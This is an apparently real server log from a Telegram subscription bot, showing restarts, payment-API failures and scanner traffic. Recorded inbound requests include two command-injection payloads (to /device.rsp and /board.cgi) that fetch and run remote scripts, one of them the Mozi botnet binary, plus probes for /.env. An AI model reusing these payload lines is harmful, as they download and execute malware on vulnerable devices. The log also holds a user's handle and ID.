2026-05-23 08:27:04 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-23 08:27:04 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAICBWoR...
2026-05-23 08:27:04 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-23 08:27:04 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-23 08:27:04 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-23 08:27:04 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-23 08:27:04 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-23 08:27:11 | INFO     | aiohttp.access | 133.201.232.96 [23/May/2026:07:27:11 -0800] "GET / HTTP/1.0" 404 173 "-" "-"
2026-05-23 08:27:18 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-23 08:27:25 | INFO     | utils.currency | Курс USD/RUB обновлён: 71.246783
2026-05-23 08:27:25 | ERROR    | payments.tribute | Tribute сетевая ошибка: Cannot connect to host tribute.tg:443 ssl:True [SSLCertVerificationError: (1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1010)')]
2026-05-23 08:29:15 | INFO     | aiohttp.access | 50.116.22.158 [23/May/2026:07:29:15 -0800] "GET /login HTTP/1.1" 404 173 "-" "Go-http-client/1.1"
2026-05-23 08:29:40 | INFO     | handlers.tribute_webhook | Tribute webhook получен: None | payload={}
2026-05-23 08:29:40 | INFO     | aiohttp.access | 127.0.0.1 [23/May/2026:07:29:40 -0800] "POST /tribute/webhook HTTP/1.1" 200 174 "-" "Go-http-client/2.0"
2026-05-23 08:30:07 | INFO     | handlers.tribute_webhook | Tribute webhook получен: None | payload={}
2026-05-23 08:30:07 | INFO     | aiohttp.access | 127.0.0.1 [23/May/2026:07:30:07 -0800] "POST /tribute/webhook HTTP/1.1" 200 174 "-" "Go-http-client/2.0"
2026-05-23 08:33:12 | INFO     | handlers.tribute_webhook | Tribute webhook получен: None | payload={}
2026-05-23 08:33:12 | INFO     | aiohttp.access | 127.0.0.1 [23/May/2026:07:33:12 -0800] "POST /tribute/webhook HTTP/1.1" 200 174 "-" "Go-http-client/2.0"
2026-05-23 08:34:09 | INFO     | aiohttp.access | 127.0.0.1 [23/May/2026:07:34:09 -0800] "GET /health HTTP/1.1" 200 174 "-" "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.22000.2538"
2026-05-23 08:35:02 | ERROR    | payments.tribute | Tribute сетевая ошибка: Cannot connect to host tribute.tg:443 ssl:True [SSLCertVerificationError: (1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1010)')]
2026-05-23 08:40:06 | INFO     | __main__ | Запуск бота...
2026-05-23 08:40:06 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-23 08:40:06 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-23 08:40:06 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-23 08:40:06 | INFO     | __main__ | Запуск polling и webhook-сервера...
2026-05-23 08:40:06 | INFO     | __main__ | Tribute webhook сервер запущен на порту 8080
2026-05-23 08:40:06 | INFO     | database.db | База данных инициализирована
2026-05-23 08:40:06 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-23 08:40:06 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-23 08:40:06 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-23 08:40:06 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-23 08:40:06 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-23 08:40:06 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-23 08:40:06 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAICBWoR...
2026-05-23 08:40:06 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-23 08:40:07 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-23 08:40:07 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-23 08:40:07 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-23 08:40:07 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-23 08:41:14 | INFO     | handlers.tribute_webhook | Tribute webhook получен: None | payload={}
2026-05-23 08:41:14 | INFO     | aiohttp.access | 127.0.0.1 [23/May/2026:07:41:14 -0800] "POST /tribute/webhook HTTP/1.1" 200 174 "-" "Go-http-client/2.0"
2026-05-23 08:42:10 | INFO     | handlers.tribute_webhook | Tribute webhook получен: None | payload={}
2026-05-23 08:42:10 | INFO     | aiohttp.access | 127.0.0.1 [23/May/2026:07:42:10 -0800] "POST /tribute/webhook HTTP/1.1" 200 174 "-" "Go-http-client/2.0"
2026-05-23 08:44:06 | INFO     | aiohttp.access | 127.0.0.1 [23/May/2026:07:44:06 -0800] "GET /health HTTP/1.1" 200 174 "-" "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.22000.2538"
2026-05-23 08:44:21 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-23 08:44:27 | INFO     | utils.currency | Курс USD/RUB обновлён: 71.246783
2026-05-23 08:44:27 | ERROR    | payments.tribute | Tribute API HTTP 404: {'requestId': '1e0180b957355119ac06782936f6bfba', 'code': 'error_not_found', 'message': 'shop not found'}
2026-05-23 08:44:55 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-23 08:44:56 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-23 08:45:12 | ERROR    | payments.tribute | Tribute API HTTP 404: {'requestId': 'cfee2b42b5977203a3c96552ea0ccfa9', 'code': 'error_not_found', 'message': 'shop not found'}
2026-05-23 08:50:25 | ERROR    | payments.tribute | Tribute API HTTP 404: {'requestId': '25cd42b02eee38aaa7ddefc104d73bda', 'code': 'error_not_found', 'message': 'shop not found'}
2026-05-23 08:50:30 | ERROR    | payments.lava | Lava API HTTP 404: {'data': None, 'error': 'Проект не найден', 'status': 404, 'status_check': False}
2026-05-23 08:50:41 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 52249104
2026-05-23 08:50:41 | INFO     | handlers.payment | Инвойс создан: user=767917200, system=cryptobot, invoice=52249104
2026-05-23 08:59:18 | ERROR    | payments.lava | Lava API HTTP 404: {'data': None, 'error': 'Проект не найден', 'status': 404, 'status_check': False}
2026-05-23 08:59:23 | ERROR    | payments.lava | Lava API HTTP 404: {'data': None, 'error': 'Проект не найден', 'status': 404, 'status_check': False}
2026-05-23 09:01:43 | INFO     | __main__ | Запуск бота...
2026-05-23 09:01:43 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-23 09:01:43 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-23 09:01:43 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-23 09:01:43 | INFO     | __main__ | Запуск polling и webhook-сервера...
2026-05-23 09:01:43 | INFO     | __main__ | Tribute webhook сервер запущен на порту 8080
2026-05-23 09:01:43 | INFO     | database.db | База данных инициализирована
2026-05-23 09:01:43 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-23 09:01:43 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-23 09:01:43 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-23 09:01:43 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-23 09:01:44 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-23 09:01:44 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-23 09:01:44 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAICBWoR...
2026-05-23 09:01:44 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-23 09:01:44 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-23 09:01:44 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-23 09:01:44 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-23 09:01:44 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-23 09:03:06 | INFO     | handlers.tribute_webhook | Tribute webhook получен: None | payload={}
2026-05-23 09:03:06 | INFO     | aiohttp.access | 127.0.0.1 [23/May/2026:08:03:06 -0800] "POST /tribute/webhook HTTP/1.1" 200 174 "-" "Go-http-client/2.0"
2026-05-23 09:04:11 | INFO     | utils.currency | Курс USD/RUB обновлён: 71.246783
2026-05-23 09:04:11 | ERROR    | payments.tribute | Tribute API HTTP 404: {'requestId': 'ce24d07eeb452d522e7963568a907682', 'code': 'error_not_found', 'message': 'shop not found'}
2026-05-23 09:04:16 | ERROR    | payments.lava | Lava API HTTP 404: {'data': None, 'error': 'Проект не найден', 'status': 404, 'status_check': False}
2026-05-23 09:04:22 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 52249958
2026-05-23 09:04:22 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=52249958
2026-05-23 09:04:44 | ERROR    | payments.tribute | Tribute API HTTP 404: {'requestId': '2b5b27e778811bf6b827e28e10e1b748', 'code': 'error_not_found', 'message': 'shop not found'}
2026-05-23 09:11:45 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-23 09:11:52 | ERROR    | payments.tribute | Tribute API HTTP 404: {'requestId': '0136626bb2bce3ec4fd94240b0871ed0', 'code': 'error_not_found', 'message': 'shop not found'}
2026-05-23 10:02:12 | INFO     | aiohttp.access | 208.84.100.117 [23/May/2026:09:02:12 -0800] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&cd%20%2Ftmp%20%20cd%20%2Fvar%2Frun%20%20cd%20%2Fmnt%20%20cd%20%2Froot%20%20cd%20%2F%3B%20wget%20http%3A%2F%2F142.248.80.144%2Ftempek.sh%3B%20chmod%20777%20%2A%3B%20sh%20tempek.sh%3B%20rm%20-rf%20%2A.sh%3B%20history%20-c195.10.205.15:8080 HTTP/0.9" 404 173 "-" "Mozila/5.0"
2026-05-23 10:15:51 | INFO     | aiohttp.access | 185.226.93.242 [23/May/2026:09:15:51 -0800] "GET /login HTTP/1.1" 404 173 "-" "Go-http-client/1.1"
2026-05-23 10:21:22 | INFO     | aiohttp.access | 20.64.104.62 [23/May/2026:09:21:22 -0800] "GET /manager/text/list HTTP/1.1" 404 173 "-" "Mozilla/5.0 zgrab/0.x"
2026-05-23 11:20:37 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01\x01\x89\x01'
      ^
2026-05-23 11:20:37 | INFO     | aiohttp.access | 86.52.52.108 [23/May/2026:10:20:37 -0800] "UNKNOWN / HTTP/1.0" 400 225 "-" "-"
2026-05-23 11:22:32 | INFO     | aiohttp.access | 45.198.224.5 [23/May/2026:10:22:32 -0800] "GET /login HTTP/1.1" 404 173 "-" "Go-http-client/1.1"
2026-05-23 11:34:01 | INFO     | aiohttp.access | 45.135.193.193 [23/May/2026:10:34:01 -0800] "CONNECT  HTTP/1.1" 404 173 "-" "-"
2026-05-23 11:58:26 | INFO     | aiohttp.access | 185.226.93.242 [23/May/2026:10:58:26 -0800] "GET /login HTTP/1.1" 404 173 "-" "Go-http-client/1.1"
2026-05-23 12:56:15 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01'
      ^
2026-05-23 12:56:15 | INFO     | aiohttp.access | 205.210.31.64 [23/May/2026:11:56:15 -0800] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
2026-05-23 12:56:15 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01'
      ^
2026-05-23 12:56:15 | INFO     | aiohttp.access | 205.210.31.64 [23/May/2026:11:56:15 -0800] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
2026-05-23 13:00:41 | INFO     | aiohttp.access | 5.61.209.126 [23/May/2026:12:00:41 -0800] "GET /SDK/webLanguage HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
2026-05-23 13:46:08 | INFO     | aiohttp.access | 23.94.204.22 [23/May/2026:12:46:08 -0800] "GET /healthz HTTP/1.1" 404 173 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
2026-05-23 13:57:44 | INFO     | aiohttp.access | 45.205.1.71 [23/May/2026:12:57:44 -0800] "GET / HTTP/1.1" 404 192 "-" "curl/7.68.0"
2026-05-23 14:19:53 | INFO     | aiohttp.access | 45.79.207.110 [23/May/2026:13:19:53 -0800] "GET / HTTP/1.1" 404 173 "-" "Mozilla/5.0 zgrab/0.x"
2026-05-23 14:34:45 | INFO     | aiohttp.access | 45.79.207.110 [23/May/2026:13:34:45 -0800] "GET / HTTP/1.1" 404 173 "-" "Mozilla/5.0 zgrab/0.x"
2026-05-23 14:45:49 | INFO     | aiohttp.access | 103.98.37.79 [23/May/2026:13:45:49 -0800] "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://103.98.37.79:53566/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0" 404 173 "-" "-"
2026-05-23 15:26:26 | INFO     | aiohttp.access | 176.65.139.254 [23/May/2026:14:26:26 -0800] "GET /login HTTP/1.1" 404 173 "-" "Go-http-client/1.1"
2026-05-23 15:29:42 | INFO     | aiohttp.access | 176.65.139.66 [23/May/2026:14:29:42 -0800] "GET /login HTTP/1.1" 404 173 "-" "Go-http-client/1.1"
2026-05-23 15:49:16 | INFO     | aiohttp.access | 47.109.91.215 [23/May/2026:14:49:16 -0800] "GET /.env HTTP/1.1" 404 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
2026-05-23 15:57:10 | INFO     | aiohttp.access | 45.198.224.7 [23/May/2026:14:57:10 -0800] "GET / HTTP/1.1" 404 173 "-" "-"
2026-05-23 16:02:07 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01'
      ^
2026-05-23 16:02:07 | INFO     | aiohttp.access | 165.154.104.235 [23/May/2026:15:02:07 -0800] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
2026-05-23 16:02:17 | INFO     | aiohttp.access | 165.154.104.235 [23/May/2026:15:02:17 -0800] "GET / HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
2026-05-23 16:02:36 | INFO     | aiohttp.access | 165.154.104.235 [23/May/2026:15:02:36 -0800] "GET /favicon.ico HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
2026-05-23 16:02:36 | INFO     | aiohttp.access | 165.154.104.235 [23/May/2026:15:02:36 -0800] "GET /robots.txt HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
2026-05-23 16:02:37 | INFO     | aiohttp.access | 165.154.104.235 [23/May/2026:15:02:37 -0800] "GET /sitemap.xml HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
2026-05-23 16:02:41 | INFO     | aiohttp.access | 165.154.104.235 [23/May/2026:15:02:41 -0800] "POST /update_weights_from_tensor HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
2026-05-23 16:03:00 | INFO     | aiohttp.access | 8.209.211.155 [23/May/2026:15:03:00 -0800] "GET / HTTP/1.1" 404 173 "-" "curl/7.64.1"
2026-05-23 16:03:04 | INFO     | aiohttp.access | 8.209.211.155 [23/May/2026:15:03:04 -0800] "GET / HTTP/1.1" 404 192 "-" "curl/7.74.0"
2026-05-23 16:15:35 | INFO     | aiohttp.access | 45.135.193.193 [23/May/2026:15:15:35 -0800] "CONNECT  HTTP/1.1" 404 173 "-" "-"
2026-05-23 16:18:53 | INFO     | aiohttp.access | 45.198.224.5 [23/May/2026:15:18:53 -0800] "GET /login HTTP/1.1" 404 173 "-" "Go-http-client/1.1"
2026-05-23 17:01:55 | INFO     | aiohttp.access | 185.226.93.242 [23/May/2026:16:01:55 -0800] "GET /login HTTP/1.1" 404 173 "-" "Go-http-client/1.1"
2026-05-23 17:04:51 | INFO     | aiohttp.access | 45.135.193.193 [23/May/2026:16:04:51 -0800] "CONNECT  HTTP/1.1" 404 173 "-" "-"
2026-05-23 17:35:02 | INFO     | aiohttp.access | 45.198.224.9 [23/May/2026:16:35:02 -0800] "GET / HTTP/1.1" 404 192 "-" "curl/7.68.0"
2026-05-23 17:55:19 | INFO     | aiohttp.access | 151.243.11.35 [23/May/2026:16:55:19 -0800] "GET / HTTP/1.1" 404 192 "-" "curl/7.68.0"
2026-05-23 18:16:27 | INFO     | aiohttp.access | 5.61.209.126 [23/May/2026:17:16:27 -0800] "GET /SDK/webLanguage HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
2026-05-23 18:37:34 | INFO     | aiohttp.access | 194.187.176.18 [23/May/2026:17:37:34 -0800] "GET / HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
2026-05-23 18:37:34 | INFO     | aiohttp.access | 194.187.176.150 [23/May/2026:17:37:34 -0800] "GET /favicon.ico HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
2026-05-23 18:51:35 | INFO     | aiohttp.access | 205.210.31.231 [23/May/2026:17:51:35 -0800] "GET / HTTP/1.0" 404 173 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
2026-05-23 18:58:50 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01'
      ^
2026-05-23 18:58:50 | INFO     | aiohttp.access | 66.132.186.198 [23/May/2026:17:58:50 -0800] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
2026-05-23 18:58:53 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01'
      ^
2026-05-23 18:58:53 | INFO     | aiohttp.access | 66.132.186.198 [23/May/2026:17:58:53 -0800] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
2026-05-23 18:58:53 | INFO     | aiohttp.access | 66.132.186.198 [23/May/2026:17:58:53 -0800] "GET / HTTP/1.1" 404 173 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
2026-05-23 18:58:54 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadHttpMessage: 400, message:
  Pause on PRI/Upgrade:

    b''
      ^
2026-05-23 18:58:54 | INFO     | aiohttp.access | 66.132.186.198 [23/May/2026:17:58:54 -0800] "UNKNOWN / HTTP/1.0" 400 195 "-" "-"
2026-05-23 18:58:57 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01'
      ^
2026-05-23 18:58:57 | INFO     | aiohttp.access | 66.132.186.198 [23/May/2026:17:58:57 -0800] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
2026-05-23 18:58:57 | INFO     | aiohttp.access | 66.132.186.198 [23/May/2026:17:58:57 -0800] "GET /wiki HTTP/1.1" 404 173 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
2026-05-23 19:37:59 | INFO     | aiohttp.access | 52.207.238.74 [23/May/2026:18:37:59 -0800] "GET / HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
2026-05-23 19:41:22 | INFO     | aiohttp.access | 62.210.198.175 [23/May/2026:18:41:22 -0800] "HEAD / HTTP/1.1" 404 159 "-" "curl/7.81.0"
2026-05-23 19:41:22 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01\x02'
      ^
2026-05-23 19:41:22 | INFO     | aiohttp.access | 62.210.198.175 [23/May/2026:18:41:22 -0800] "UNKNOWN / HTTP/1.0" 400 217 "-" "-"
2026-05-23 19:41:23 | INFO     | aiohttp.access | 62.210.198.175 [23/May/2026:18:41:23 -0800] "GET / HTTP/1.1" 404 173 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3"
2026-05-23 19:41:24 | INFO     | aiohttp.access | 62.210.198.175 [23/May/2026:18:41:24 -0800] "GET /favicon.ico HTTP/1.1" 404 173 "http://195.10.205.15:8080/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3"
2026-05-23 19:41:28 | INFO     | aiohttp.access | 62.210.198.175 [23/May/2026:18:41:28 -0800] "GET /favicon.ico HTTP/1.1" 404 173 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3"
2026-05-23 19:41:28 | INFO     | aiohttp.access | 62.210.198.175 [23/May/2026:18:41:28 -0800] "GET /ads.txt HTTP/1.1" 404 173 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3"
2026-05-23 19:41:28 | INFO     | aiohttp.access | 62.210.198.175 [23/May/2026:18:41:28 -0800] "GET /app-ads.txt HTTP/1.1" 404 173 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3"
2026-05-23 19:41:28 | INFO     | aiohttp.access | 62.210.198.175 [23/May/2026:18:41:28 -0800] "GET /sellers.json HTTP/1.1" 404 173 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3"
2026-05-23 19:54:21 | INFO     | aiohttp.access | 65.49.1.162 [23/May/2026:18:54:21 -0800] "GET / HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
2026-05-23 19:55:55 | INFO     | aiohttp.access | 65.49.1.170 [23/May/2026:18:55:55 -0800] "GET /favicon.ico HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
2026-05-23 19:58:42 | INFO     | aiohttp.access | 65.49.1.169 [23/May/2026:18:58:42 -0800] "GET /?format=json HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/135.0.0.0 Safari/537.36"
2026-05-23 19:59:07 | INFO     | aiohttp.access | 65.49.1.163 [23/May/2026:18:59:07 -0800] "CONNECT  HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/135.0.0.0 Safari/537.36"
2026-05-23 19:59:35 | INFO     | aiohttp.access | 65.49.1.162 [23/May/2026:18:59:35 -0800] "GET /geoserver/web/ HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/135.0.0.0 Safari/537.36"
2026-05-23 20:14:54 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01'
      ^
